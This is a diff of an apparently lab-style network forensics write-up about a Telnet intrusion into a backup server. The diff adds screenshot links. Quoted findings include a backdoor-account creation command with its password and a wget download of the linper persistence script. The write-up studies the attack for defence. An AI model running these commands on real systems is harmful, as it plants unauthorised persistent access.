@@ -36,7 +36,8 @@ The attacker connected to the backup server using Telnet and successfully gained
 Telnet session establishment visible in packet capture.
 
 📷 **Screenshot Placeholder**
-(Insert Telnet handshake screenshot)
+
+<img width="1919" height="359" alt="Screenshot 2026-02-18 123649" src="https://github.com/user-attachments/assets/087658c8-9db0-4626-9dcf-cda0c8f98110" />
 
 ---
 
@@ -51,7 +52,8 @@ DHCP traffic reveals hostname of compromised machine.
 DHCP packet shows hostname field.
 
 📷 **Screenshot Placeholder**
-(Insert DHCP hostname screenshot)
+
+ <img width="1572" height="870" alt="Screenshot 2026-02-18 123817" src="https://github.com/user-attachments/assets/11f2c7ee-bc19-47fb-afcf-cbab05a1115a" />
 
 ---
 
@@ -72,7 +74,8 @@ sudo useradd -m -s /bin/bash cleanupsvc
 * Password: **YouKnowWhoiam69**
 
 📷 **Screenshot Placeholder**
-(Insert user creation command screenshot)
+
+<img width="1919" height="956" alt="Screenshot 2026-02-18 124019" src="https://github.com/user-attachments/assets/53bbf24a-434b-4b99-918e-6f19713ffe89" />
 
 ---
 
@@ -89,7 +92,8 @@ wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linp
 Download confirmed via HTTP stream.
 
 📷 **Screenshot Placeholder**
-(Insert wget download screenshot)
+
+<img width="1744" height="566" alt="Screenshot 2026-02-18 124202" src="https://github.com/user-attachments/assets/c32e9b2c-20a3-4d55-b29b-9890b6b16025" />
 
 ---
 
@@ -115,7 +119,8 @@ Sensitive database file transferred out.
 File observed in exported HTTP objects list.
 
 📷 **Screenshot Placeholder**
-(Insert HTTP object export screenshot)
+
+<img width="1031" height="287" alt="Screenshot 2026-02-18 124251" src="https://github.com/user-attachments/assets/22df1885-fdc7-43f8-8cf0-580576327103" />
 
 ---
 
@@ -168,3 +173,4 @@ This confirms sensitive financial data exposure.
 ## 🧾 Conclusion
 
 The attacker exploited an exposed Telnet service, gained root access, created a persistent backdoor account, installed a remote access script, and exfiltrated a sensitive customer database within minutes. The system lacked service hardening and outbound monitoring, allowing rapid compromise and data theft.
+
